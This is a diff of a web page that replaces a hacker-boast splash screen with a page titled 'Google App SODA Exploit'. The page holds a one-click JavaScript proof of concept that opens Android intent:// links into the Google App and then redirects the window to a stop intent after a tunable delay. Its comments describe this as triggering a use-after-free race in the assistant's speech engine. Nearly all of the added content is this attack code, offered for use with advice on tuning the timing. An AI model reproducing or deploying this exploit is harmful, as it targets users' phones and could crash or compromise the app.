@@ -1,42 +1,43 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <title>1337</title>
+    <title>Google App SODA Exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body {
-            background: #050505;
-            color: #00ff41;
-            font-family: monospace;
-            text-align: center;
-            padding-top: 100px;
-        }
-
-        h1 {
-            font-size: 150px;
-            margin: 0;
-            text-shadow: 0 0 25px #00ff41;
-        }
-
-        p {
-            font-size: 22px;
-            letter-spacing: 2px;
-        }
-
-        .glitch {
-            color: red;
-            text-shadow: 2px 0 lime, -2px 0 blue;
-        }
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; background: #d93025; color: white; border: none; border-radius: 5px; }
     </style>
 </head>
 <body>
+    <h2>Google App Tier 1 Exploit</h2>
+    <p>Click below to trigger the SODA UAF via Intents.</p>
+    <button id="attackBtn">Run 1-Click Exploit</button>
 
-    <h1>1337</h1>
+    <script>
+        document.getElementById("attackBtn").addEventListener("click", function() {
+            
+            // 1. Define the Intents using Android's intent:// scheme syntax
+            // This forces Chrome to route the link directly to the Google App
+            var startIntent = "intent://assistant.google.com/services/invoke#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+            
+            // We use the wuwa/stop endpoint which kills active voice sessions
+            var stopIntent = "intent://assistant.google.com/wuwa/stop#Intent;scheme=http;package=com.google.android.googlequicksearchbox;end";
 
-    <p class="glitch">INTENT REDIRECTION: SUCCESS</p>
-    <p>CAN OPEN ANY URL 💀</p>
-    <p>Security said "no" — 1337 said "watch me."</p>
-    <p> [ ACCESS GRANTED ] </p>
+            // 2. Open the Start Intent to spin up the SODA Engine
+            var attackWindow = window.open(startIntent, '_blank');
 
+            // 3. The Race Condition!
+            // Wait for the Google App to allocate the SODA C++ object and start the audio thread.
+            // 800ms is a good starting guess for a cold Assistant launch from Chrome.
+            setTimeout(function() {
+                
+                // Redirect that same window to the Stop intent to trigger the flawed Read-Lock teardown
+                attackWindow.location.href = stopIntent;
+                
+                console.log("[*] Exploit fired.");
+                
+            }, 800); // <-- You will need to tune this delay (e.g., 200ms, 500ms, 1200ms)
+        });
+    </script>
 </body>
 </html>
